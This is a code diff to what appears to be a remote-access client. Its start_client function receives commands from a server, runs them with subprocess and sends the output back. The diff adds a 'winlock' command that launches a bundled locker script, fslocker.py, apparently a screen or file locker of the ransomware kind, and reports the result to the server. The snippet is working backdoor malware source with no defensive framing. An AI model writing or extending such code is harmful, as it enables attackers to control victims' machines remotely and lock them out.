@@ -43,6 +43,14 @@ def start_client(server_ip, server_port):
                     client.send(f"Error: {str(e)}".encode())
                 continue
 
+            if command.lower() == "winlock":
+                try:
+                    result = subprocess.check_output(['python', os.path.join(os.path.dirname(__file__), 'tools', 'fslocker.py')], universal_newlines=True)
+                    client.send(result.encode())
+                except Exception as e:
+                    client.send(f"Error: {str(e)}".encode())
+                continue
+
             try:
                 output = subprocess.check_output(
                     command,
